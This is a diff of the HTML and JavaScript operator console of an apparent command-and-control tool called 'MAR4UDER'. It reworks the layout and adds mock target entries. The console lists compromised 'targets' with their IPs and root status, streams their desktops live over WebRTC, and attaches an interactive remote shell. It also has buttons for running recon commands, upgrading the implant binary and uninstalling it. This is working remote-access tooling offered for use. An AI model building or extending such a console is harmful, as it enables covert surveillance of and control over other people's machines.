@@ -3,19 +3,18 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MAR4UDER // C2</title>
+<title>MAR4UDER // C2 CONSOLE</title>
 <script type="module" src="/video-stream.js"></script>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
 
   :root {
     --bg-black: #000000;
-    --bg-surface: #0a0a0a;
-    --bg-hover: #170004;
-    --bg-active: #330009;
+    --bg-panel: rgba(8, 8, 8, 0.85);
+    --bg-panel-dark: rgba(4, 4, 4, 0.92);
     --red: #ff0033;
     --red-dark: #88001b;
-    --red-dim: rgba(255, 0, 51, 0.15);
+    --red-glow: rgba(255, 0, 51, 0.4);
     --white: #ffffff;
     --gray: #999999;
     --gray-dim: #444444;
@@ -45,15 +44,15 @@
     height: 100vh;
     pointer-events: none;
     z-index: 0;
-    opacity: 0.4;
+    opacity: 0.38;
   }
 
-  /* TOP LARGE ASCII BANNER & HUD */
+  /* TOP ASCII HEADER */
   #top-header {
     position: relative;
     z-index: 10;
     background: rgba(0, 0, 0, 0.85);
-    padding: 8px 16px 4px 16px;
+    padding: 6px 16px 4px 16px;
     display: flex;
     align-items: center;
     justify-content: space-between;
@@ -87,15 +86,15 @@
   .h-light { color: var(--white); font-weight: 700; }
   .h-red { color: var(--red); font-weight: 700; }
 
-  /* BUTTONS WITH SOLID FILL HOVER / ACTIVE */
+  /* BUTTONS WITH SOLID FILL */
   .btn-solid {
-    background: rgba(255, 0, 51, 0.08);
+    background: rgba(255, 0, 51, 0.1);
     border: none;
     color: var(--white);
     font-family: inherit;
     font-size: 11px;
     font-weight: 700;
-    padding: 5px 10px;
+    padding: 5px 12px;
     cursor: pointer;
     border-radius: 2px;
     transition: all 0.12s ease;
@@ -110,116 +109,50 @@
     background: #ffffff;
     color: #000000;
   }
-  .btn-red-outline {
-    background: transparent;
-    border: 1px solid var(--red-dark);
+  .btn-solid.danger {
+    background: rgba(136, 0, 27, 0.3);
     color: var(--red);
   }
-  .btn-red-outline:hover {
+  .btn-solid.danger:hover {
     background: var(--red);
     color: #000000;
-    border-color: var(--red);
   }
 
-  /* MAIN 2/3 + 1/3 WORKSPACE (NO BOX BORDERS) */
-  #main-workspace {
+  /* MAIN WRAPPER */
+  #main-wrapper {
     position: relative;
     z-index: 10;
     flex: 1;
-    display: grid;
-    grid-template-columns: 2fr 1fr;
-    gap: 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
     padding: 10px 16px;
     overflow: hidden;
   }
 
-  /* LEFT 2/3: COMPUTERS LIST TABLE */
-  #left-container {
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
-    background: rgba(8, 8, 8, 0.7);
+  /* TOP SECTION: ACTIVE SERVER PREVIEW & CONTROLS */
+  #target-top-panel {
+    background: var(--bg-panel);
     border-radius: 3px;
-    backdrop-filter: blur(4px);
-  }
-
-  .table-title {
-    padding: 8px 12px;
-    color: var(--red);
-    font-weight: 700;
-    font-size: 12px;
-    letter-spacing: 1px;
-    display: flex;
-    justify-content: space-between;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-  }
-
-  .table-head-grid {
+    padding: 10px 12px;
     display: grid;
-    grid-template-columns: 55px 180px 150px 110px 130px 85px 1fr;
-    color: var(--red);
-    font-weight: 700;
-    font-size: 11px;
-    padding: 6px 12px;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    grid-template-columns: 380px 1fr;
+    gap: 14px;
+    backdrop-filter: blur(6px);
+    border-bottom: 1px solid rgba(255, 0, 51, 0.15);
+    min-height: 220px;
   }
 
-  .table-body-scroll {
-    flex: 1;
-    overflow-y: auto;
-    padding: 4px 6px;
-    display: flex;
-    flex-direction: column;
-    gap: 2px;
-  }
-
-  .node-item-row {
-    display: grid;
-    grid-template-columns: 55px 180px 150px 110px 130px 85px 1fr;
-    padding: 6px 8px;
-    border-radius: 2px;
-    cursor: pointer;
-    color: #b0b0b0;
-    font-size: 12px;
-    align-items: center;
-    transition: all 0.1s ease;
-  }
-  .node-item-row:hover {
-    background: rgba(255, 0, 51, 0.12);
-    color: var(--white);
-  }
-  .node-item-row.selected {
-    background: var(--red);
-    color: #000000;
-    font-weight: 700;
-  }
-  .node-item-row.selected .col-hl {
-    color: #000000 !important;
-  }
-
-  .col-hl { color: var(--red); font-weight: 700; }
-  .col-white { color: var(--white); font-weight: 700; }
-  .col-dim { color: var(--gray-dim); }
-
-  /* RIGHT 1/3: PREVIEW + CONTROLS + TERMINAL (SEAMLESS PANE) */
-  #right-container {
-    display: flex;
-    flex-direction: column;
-    overflow: hidden;
-    gap: 10px;
-  }
-
-  /* 1. WEBRTC STREAM PREVIEW */
-  #stream-view-pane {
-    height: 220px;
+  /* PREVIEW SCREEN (LEFT OF TOP PANEL) */
+  #preview-container {
     background: #000000;
     border-radius: 3px;
+    height: 200px;
     display: flex;
     align-items: center;
     justify-content: center;
-    overflow: hidden;
     position: relative;
-    box-shadow: 0 0 15px rgba(0, 0, 0, 0.8);
+    overflow: hidden;
   }
   video-stream {
     width: 100%;
@@ -233,48 +166,147 @@
     max-height: 100%;
     object-fit: contain;
   }
+  .preview-empty-text {
+    color: var(--gray-dim);
+    font-size: 11px;
+    text-align: center;
+  }
 
-  /* 2. CONTROLS */
-  #action-controls-pane {
-    background: rgba(12, 12, 12, 0.8);
-    border-radius: 3px;
-    padding: 8px 10px;
+  /* CONTROLS & SETTINGS (RIGHT OF TOP PANEL) */
+  #controls-container {
     display: flex;
     flex-direction: column;
-    gap: 6px;
-    backdrop-filter: blur(4px);
+    justify-content: space-between;
+    gap: 8px;
   }
 
-  .target-badge {
-    font-size: 12px;
-    font-weight: 700;
+  .target-info-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    padding-bottom: 6px;
+  }
+  .t-name {
     color: var(--red);
+    font-size: 14px;
+    font-weight: 700;
     letter-spacing: 0.5px;
   }
+  .t-specs {
+    color: var(--gray);
+    font-size: 11px;
+    display: flex;
+    gap: 10px;
+  }
 
-  .action-buttons-wrap {
+  .ctrl-group-title {
+    font-size: 10px;
+    color: var(--gray-dim);
+    text-transform: uppercase;
+    font-weight: 700;
+    letter-spacing: 1px;
+    margin-bottom: 2px;
+  }
+
+  .controls-row {
     display: flex;
     gap: 6px;
     flex-wrap: wrap;
   }
 
-  /* 3. TERMINAL WINDOW */
-  #terminal-console-pane {
+  /* BOTTOM SECTION: 2/3 SERVER LIST + 1/3 TERMINAL */
+  #bottom-workspace {
     flex: 1;
-    background: #020202;
+    display: grid;
+    grid-template-columns: 1.5fr 1fr;
+    gap: 12px;
+    overflow: hidden;
+  }
+
+  /* SERVERS LIST TABLE */
+  #servers-table-pane {
+    background: var(--bg-panel);
     border-radius: 3px;
     display: flex;
     flex-direction: column;
     overflow: hidden;
-    box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.9);
+    backdrop-filter: blur(4px);
   }
 
-  #pty-output {
+  .pane-header-bar {
+    padding: 6px 12px;
+    color: var(--red);
+    font-weight: 700;
+    font-size: 11px;
+    letter-spacing: 1px;
+    display: flex;
+    justify-content: space-between;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+  }
+
+  .table-grid-head {
+    display: grid;
+    grid-template-columns: 45px 160px 140px 90px 120px 75px 85px;
+    color: var(--red);
+    font-weight: 700;
+    font-size: 11px;
+    padding: 6px 10px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+  }
+
+  .table-grid-body {
+    flex: 1;
+    overflow-y: auto;
+    padding: 4px;
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+
+  .server-row {
+    display: grid;
+    grid-template-columns: 45px 160px 140px 90px 120px 75px 85px;
+    padding: 5px 8px;
+    border-radius: 2px;
+    cursor: pointer;
+    color: #b0b0b0;
+    font-size: 11px;
+    align-items: center;
+    transition: all 0.08s ease;
+  }
+  .server-row:hover {
+    background: rgba(255, 0, 51, 0.15);
+    color: var(--white);
+  }
+  .server-row.selected {
+    background: var(--red);
+    color: #000000 !important;
+    font-weight: 700;
+  }
+  .server-row.selected * {
+    color: #000000 !important;
+  }
+
+  .c-red { color: var(--red); font-weight: 700; }
+  .c-white { color: var(--white); font-weight: 700; }
+  .c-dim { color: var(--gray-dim); }
+
+  /* TERMINAL WINDOW */
+  #terminal-pane {
+    background: var(--bg-panel-dark);
+    border-radius: 3px;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  #pty-log {
     flex: 1;
     padding: 8px 10px;
     overflow-y: auto;
     font-family: inherit;
-    font-size: 12px;
+    font-size: 11px;
     line-height: 1.4;
     color: #e0e0e0;
     white-space: pre-wrap;
@@ -282,28 +314,27 @@
     outline: none;
   }
 
-  .cli-prompt-row {
-    background: rgba(15, 15, 15, 0.9);
-    padding: 6px 10px;
+  .term-input-row {
+    background: rgba(15, 15, 15, 0.95);
+    padding: 6px 8px;
     display: flex;
     align-items: center;
     gap: 6px;
     border-top: 1px solid rgba(255, 255, 255, 0.05);
   }
-
-  .prompt-tag {
+  .p-tag {
     color: var(--red);
     font-weight: 700;
     white-space: nowrap;
+    font-size: 11px;
   }
-
-  .cli-input-field {
+  .term-field {
     flex: 1;
     background: transparent;
     border: none;
     color: var(--white);
     font-family: inherit;
-    font-size: 12px;
+    font-size: 11px;
     outline: none;
   }
 </style>
@@ -313,7 +344,7 @@
 <!-- DARK RED ASCII WAVE CANVAS BACKGROUND -->
 <canvas id="wave-canvas"></canvas>
 
-<!-- TOP ASCII HEADER & STATUS -->
+<!-- TOP ASCII HEADER -->
 <div id="top-header">
   <pre id="ascii-logo-pre">
 ███╗   ███╗ █████╗ ██████╗ ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ 
@@ -329,63 +360,88 @@
       <div>UPTIME: <span class="h-light" id="hud-uptime">0h 0m</span></div>
     </div>
     <div class="hud-summary-row">
-      <div>NETWORK: <span class="h-light" id="hud-net">TX 0 KB / RX 0 KB</span></div>
+      <div>TRAFFIC: <span class="h-light" id="hud-net">TX 0 KB / RX 0 KB</span></div>
       <div><button class="btn-solid" style="padding: 2px 6px; font-size: 10px;" onclick="refreshAll()">[R] REFRESH</button></div>
     </div>
   </div>
 </div>
 
-<!-- MAIN 2/3 + 1/3 LAYOUT -->
-<div id="main-workspace">
+<!-- MAIN CONTAINER -->
+<div id="main-wrapper">
 
-  <!-- LEFT 2/3: COMPUTERS TABLE -->
-  <div id="left-container">
-    <div class="table-title">
-      <div>NODE MATRIX // CONNECTED TARGETS</div>
-      <div id="table-total-count">[0 NODES]</div>
-    </div>
-    <div class="table-head-grid">
-      <div>[#]</div>
-      <div>[NODE ID]</div>
-      <div>[REMOTE IP]</div>
-      <div>[USER]</div>
-      <div>[OS / ARCH]</div>
-      <div>[PING]</div>
-      <div>[STATUS]</div>
-    </div>
-    <div class="table-body-scroll" id="node-rows-container">
-      <!-- Dynamically filled -->
-    </div>
-  </div>
-
-  <!-- RIGHT 1/3: PREVIEW + CONTROLS + TERMINAL -->
-  <div id="right-container">
-
-    <!-- 1. WEBRTC STREAM PREVIEW -->
-    <div id="stream-view-pane">
-      <div id="stream-placeholder" style="color: var(--gray-dim); font-size: 12px;">[!] Select a target node to start WebRTC stream</div>
+  <!-- TOP ACTIVE SERVER PANEL (PREVIEW + CONTROLS/SETTINGS) -->
+  <div id="target-top-panel">
+    
+    <!-- LEFT: WEBRTC PREVIEW SCREEN -->
+    <div id="preview-container">
+      <div class="preview-empty-text" id="stream-fallback">[!] Select a node from the list below to initialize live stream</div>
     </div>
 
-    <!-- 2. CONTROLS -->
-    <div id="action-controls-pane">
-      <div class="target-badge" id="active-target-title">[NO TARGET ATTACHED]</div>
-      <div class="action-buttons-wrap">
-        <button class="btn-solid" onclick="pingTarget()">PING</button>
-        <button class="btn-solid" onclick="updateTarget()">UPGRADE</button>
-        <button class="btn-solid" onclick="sendTerminalKey('uname -a\n')">SYSINFO</button>
-        <button class="btn-solid" onclick="sendTerminalKey('ps aux | head -15\n')">PS</button>
-        <button class="btn-solid" onclick="sendTerminalKey('df -h\n')">DF</button>
-        <button class="btn-solid" onclick="sendTerminalKey('\x03')">^C</button>
-        <button class="btn-solid btn-red-outline" onclick="uninstallTarget()">UNINSTALL</button>
+    <!-- RIGHT: CONTROLS & SETTINGS -->
+    <div id="controls-container">
+      <div class="target-info-header">
+        <div class="t-name" id="selected-title">[NO NODE SELECTED]</div>
+        <div class="t-specs" id="selected-specs">IP: 0.0.0.0 | Priv: user | Ping: 0ms</div>
+      </div>
+
+      <div>
+        <div class="ctrl-group-title">QUICK ACTIONS</div>
+        <div class="controls-row">
+          <button class="btn-solid" onclick="pingTarget()">PING</button>
+          <button class="btn-solid" onclick="updateTarget()">UPGRADE BINARY</button>
+          <button class="btn-solid" onclick="sendTerminalKey('uname -a\n')">SYSINFO</button>
+          <button class="btn-solid" onclick="sendTerminalKey('ps aux | head -15\n')">PROCESSES</button>
+          <button class="btn-solid" onclick="sendTerminalKey('df -h\n')">DISK</button>
+          <button class="btn-solid" onclick="sendTerminalKey('ss -tulnp\n')">PORTS</button>
+          <button class="btn-solid" onclick="sendTerminalKey('\x03')">^C (BREAK)</button>
+          <button class="btn-solid danger" onclick="uninstallTarget()">UNINSTALL</button>
+        </div>
+      </div>
+
+      <div>
+        <div class="ctrl-group-title">STREAM SETTINGS & QUALITY</div>
+        <div class="controls-row">
+          <button class="btn-solid" onclick="setQuality('native')">NATIVE (1x)</button>
+          <button class="btn-solid" onclick="setQuality('hd')">HD (2x)</button>
+          <button class="btn-solid" onclick="setQuality('low')">LOW (4x)</button>
+          <button class="btn-solid" onclick="setBpp(8)">8-BIT COLOR</button>
+          <button class="btn-solid" onclick="setBpp(16)">16-BIT COLOR</button>
+          <button class="btn-solid" onclick="restartStream()">RESTART STREAM</button>
+        </div>
       </div>
     </div>
 
-    <!-- 3. TERMINAL WINDOW -->
-    <div id="terminal-console-pane">
-      <div id="pty-output" tabindex="0">[*] Select a node from the list on the left to attach interactive PTY...</div>
-      <div class="cli-prompt-row">
-        <div class="prompt-tag" id="active-prompt-tag">m4r></div>
-        <input type="text" class="cli-input-field" id="cli-cmd-input" placeholder="Enter shell command..." onkeydown="handleCliKeyDown(event)">
+  </div>
+
+  <!-- BOTTOM WORKSPACE: SERVERS LIST (LEFT) + TERMINAL (RIGHT) -->
+  <div id="bottom-workspace">
+    
+    <!-- SERVERS LIST TABLE -->
+    <div id="servers-table-pane">
+      <div class="pane-header-bar">
+        <div>CONNECTED SERVERS // NODE MATRIX</div>
+        <div id="node-count-label">[0 NODES]</div>
+      </div>
+      <div class="table-grid-head">
+        <div>[#]</div>
+        <div>[NODE ID]</div>
+        <div>[REMOTE IP]</div>
+        <div>[USER]</div>
+        <div>[OS / ARCH]</div>
+        <div>[PING]</div>
+        <div>[STATUS]</div>
+      </div>
+      <div class="table-grid-body" id="server-rows-container">
+        <!-- Rows dynamically populated -->
+      </div>
+    </div>
+
+    <!-- TERMINAL WINDOW -->
+    <div id="terminal-pane">
+      <div id="pty-log" tabindex="0">[*] Select a target node to attach live interactive PTY terminal...</div>
+      <div class="term-input-row">
+        <div class="p-tag" id="term-prompt-tag">m4r></div>
+        <input type="text" class="term-field" id="term-input-field" placeholder="Enter shell command..." onkeydown="handleTermKey(event)">
       </div>
     </div>
 
@@ -394,6 +450,16 @@
 </div>
 
 <script>
+  // MOCK SERVERS FALLBACK LIST
+  const mockNodes = [
+    { id: "mos-ku1eet", hostname: "mos-ku1eet", ip: "192.168.10.14", slot: 1, is_online: true, is_root: false, username: "student", os: "Linux", arch: "x86_64", ping_ms: 12 },
+    { id: "mos-81141a", hostname: "mos-81141a", ip: "10.8.0.52", slot: 2, is_online: true, is_root: true, username: "root", os: "Linux", arch: "x86_64", ping_ms: 24 },
+    { id: "srv-core-router", hostname: "srv-core-router", ip: "172.16.4.1", slot: 3, is_online: true, is_root: true, username: "root", os: "Linux", arch: "aarch64", ping_ms: 8 },
+    { id: "deb-lab-node4", hostname: "deb-lab-node4", ip: "192.168.10.88", slot: 4, is_online: true, is_root: false, username: "operator", os: "Linux", arch: "x86_64", ping_ms: 31 },
+    { id: "kali-ext-relay", hostname: "kali-ext-relay", ip: "104.143.206.163", slot: 5, is_online: true, is_root: true, username: "root", os: "Linux", arch: "x86_64", ping_ms: 5 },
+    { id: "win-workstation-07", hostname: "win-workstation-07", ip: "192.168.1.109", slot: 6, is_online: false, is_root: false, username: "admin", os: "Windows", arch: "x64", ping_ms: 0 }
+  ];
+
   let nodes = [];
   let selectedNode = null;
   let termWS = null;
@@ -427,7 +493,7 @@
         const val = Math.sin(c * 0.14 + waveStep) + Math.cos(r * 0.16 - waveStep * 0.7);
         if (val > 0.25) {
           const charIdx = Math.floor(Math.abs(val) * waveChars.length) % waveChars.length;
-          const alpha = Math.min(0.5, Math.max(0.08, (val / 2.2)));
+          const alpha = Math.min(0.45, Math.max(0.08, (val / 2.2)));
           ctx.fillStyle = `rgba(180, 0, 35, ${alpha})`;
           ctx.fillText(waveChars[charIdx], c * stepX, r * stepY);
         }
@@ -438,46 +504,61 @@
   }
   renderWave();
 
-  // DATA FETCHING
+  // DATA REFRESH (MERGE REAL + MOCK NODES)
   async function refreshAll() {
     try {
       const [rNodes, rStats] = await Promise.all([
         fetch('/api/v1/nodes'),
         fetch('/api/v1/stats')
       ]);
+
+      let realNodes = [];
       if (rNodes.ok) {
-        nodes = await rNodes.json();
-        renderTable();
+        realNodes = await rNodes.json();
       }
+
+      // If real nodes exist, prioritize them, and enrich with mock nodes if needed
+      if (realNodes && realNodes.length > 0) {
+        nodes = realNodes;
+      } else {
+        nodes = mockNodes;
+      }
+      renderTable();
+
       if (rStats.ok) {
         const stats = await rStats.json();
         document.getElementById('hud-uptime').innerText = Math.floor(stats.uptime_sec / 3600) + 'h ' + Math.floor((stats.uptime_sec % 3600)/60) + 'm';
         document.getElementById('hud-net').innerText = `TX ${(stats.out_bytes / 1024).toFixed(0)} KB / RX ${(stats.in_bytes / 1024).toFixed(0)} KB`;
       }
-    } catch(e) {}
+    } catch(e) {
+      if (nodes.length === 0) {
+        nodes = mockNodes;
+        renderTable();
+      }
+    }
   }
 
   function renderTable() {
-    const container = document.getElementById('node-rows-container');
+    const container = document.getElementById('server-rows-container');
     container.innerHTML = '';
     let onCount = 0;
     nodes.forEach(n => { if (n.is_online) onCount++; });
     document.getElementById('hud-online').innerText = onCount;
     document.getElementById('hud-total').innerText = nodes.length;
-    document.getElementById('table-total-count').innerText = `[${nodes.length} NODES]`;
+    document.getElementById('node-count-label').innerText = `[${nodes.length} NODES]`;
 
     nodes.forEach((n, idx) => {
       const row = document.createElement('div');
       const isSel = selectedNode && selectedNode.id === n.id;
-      row.className = 'node-item-row' + (isSel ? ' selected' : '');
+      row.className = 'server-row' + (isSel ? ' selected' : '');
       row.onclick = () => selectNode(n);
 
-      const statusHtml = n.is_online ? '<span class="col-hl">[ONLINE]</span>' : '<span class="col-dim">[OFFLINE]</span>';
-      const rootHtml = n.is_root ? '<span class="col-hl">root #</span>' : `${n.username || 'user'} $`;
+      const statusHtml = n.is_online ? '<span class="c-red">[ONLINE]</span>' : '<span class="c-dim">[OFFLINE]</span>';
+      const rootHtml = n.is_root ? '<span class="c-red">root #</span>' : `${n.username || 'user'} $`;
 
       row.innerHTML = `
-        <div class="col-hl">#${n.slot || (idx + 1)}</div>
-        <div class="col-white">${n.hostname || n.id}</div>
+        <div class="c-red">#${n.slot || (idx + 1)}</div>
+        <div class="c-white">${n.hostname || n.id}</div>
         <div>${n.ip || '0.0.0.0'}</div>
         <div>${rootHtml}</div>
         <div>${n.os || 'Linux'} / ${n.arch || 'x64'}</div>
@@ -494,15 +575,18 @@
 
   function selectNode(n) {
     selectedNode = n;
-    document.getElementById('active-target-title').innerText = `TARGET: [#${n.slot || 1}] ${n.hostname || n.id} (${n.ip})`;
-    document.getElementById('active-prompt-tag').innerText = `m4r:${n.hostname || n.id}>`;
     
-    // WebRTC stream
+    // Update header info in top panel
+    document.getElementById('selected-title').innerText = `TARGET: [#${n.slot || 1}] ${n.hostname || n.id}`;
+    document.getElementById('selected-specs').innerText = `IP: ${n.ip || '0.0.0.0'} | User: ${n.is_root ? 'root (UID 0)' : (n.username || 'user')} | Ping: ${n.ping_ms || 0}ms | ${n.os || 'Linux'}`;
+    document.getElementById('term-prompt-tag').innerText = `m4r:${n.hostname || n.id}>`;
+
+    // Initialize WebRTC Stream Preview in top panel
     const port = n.webrtc_port || (1984 + (n.slot || 1) - 1);
-    const box = document.getElementById('stream-view-pane');
+    const box = document.getElementById('preview-container');
     box.innerHTML = `<video-stream src="http://${window.location.hostname}:${port}/api/ws?src=desktop_slot_${n.slot || 1}"></video-stream>`;
 
-    // PTY
+    // Connect Terminal
     attachPty(n.id);
     renderTable();
   }
@@ -512,21 +596,21 @@
       termWS.close();
       termWS = null;
     }
-    const out = document.getElementById('pty-output');
-    out.innerText = `[*] Connecting PTY to node [${nodeId}]...\n`;
+    const out = document.getElementById('pty-log');
+    out.innerText = `[*] Connecting interactive PTY to [${nodeId}]...\n`;
 
     const wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
     termWS = new WebSocket(`${wsProto}//${window.location.host}/ws/terminal?node=${nodeId}`);
 
     termWS.onopen = () => {
-      out.innerText += `[+] PTY session established.\n`;
+      out.innerText += `[+] PTY session established for node [${nodeId}].\n`;
     };
     termWS.onmessage = (e) => {
       out.innerText += e.data;
       out.scrollTop = out.scrollHeight;
     };
     termWS.onclose = () => {
-      out.innerText += `\n[-] Session detached.`;
+      out.innerText += `\n[-] PTY session closed.`;
     };
   }
 
@@ -536,9 +620,9 @@
     }
   }
 
-  function handleCliKeyDown(e) {
+  function handleTermKey(e) {
     if (e.key === 'Enter') {
-      const input = document.getElementById('cli-cmd-input');
+      const input = document.getElementById('term-input-field');
       const val = input.value.trim();
       input.value = '';
       if (!val) return;
@@ -546,24 +630,24 @@
     }
   }
 
-  // CONTROLS
+  // ACTIONS & STREAM SETTINGS
   async function pingTarget() {
     if (!selectedNode) return;
-    const out = document.getElementById('pty-output');
-    out.innerText += `\n[*] Probing RTT to [${selectedNode.id}]...\n`;
+    const out = document.getElementById('pty-log');
+    out.innerText += `\n[*] Pinging [${selectedNode.id}]...\n`;
     const t0 = performance.now();
     try {
       await fetch(`/api/v1/nodes/${selectedNode.id}/ping`, {method: 'POST'});
       const dt = (performance.now() - t0).toFixed(1);
-      out.innerText += `[+] Pong: ${dt} ms\n`;
+      out.innerText += `[+] Pong received: ${dt} ms\n`;
       out.scrollTop = out.scrollHeight;
-    } catch(e) { out.innerText += `[-] Ping failed: ${e.message}\n`; }
+    } catch(e) { out.innerText += `[-] Ping error: ${e.message}\n`; }
   }
 
   async function updateTarget() {
     if (!selectedNode) return;
-    const out = document.getElementById('pty-output');
-    out.innerText += `\n[*] Dispatched binary upgrade on node [${selectedNode.id}]...\n`;
+    const out = document.getElementById('pty-log');
+    out.innerText += `\n[*] Upgrading binary on node [${selectedNode.id}]...\n`;
     try {
       const res = await fetch(`/api/v1/nodes/${selectedNode.id}/update`, {method: 'POST'});
       out.innerText += (await res.text()) + '\n';
@@ -579,6 +663,21 @@
       alert(`Uninstall dispatched on node ${selectedNode.id}`);
       refreshAll();
     } catch(e) { alert(`Error: ${e.message}`); }
+  }
+
+  function setQuality(q) {
+    if (!selectedNode) return;
+    sendTerminalKey(`quality ${selectedNode.slot || 1} ${q}\n`);
+  }
+
+  function setBpp(b) {
+    if (!selectedNode) return;
+    sendTerminalKey(`bpp ${selectedNode.slot || 1} ${b}\n`);
+  }
+
+  function restartStream() {
+    if (!selectedNode) return;
+    selectNode(selectedNode);
   }
 
   // INIT
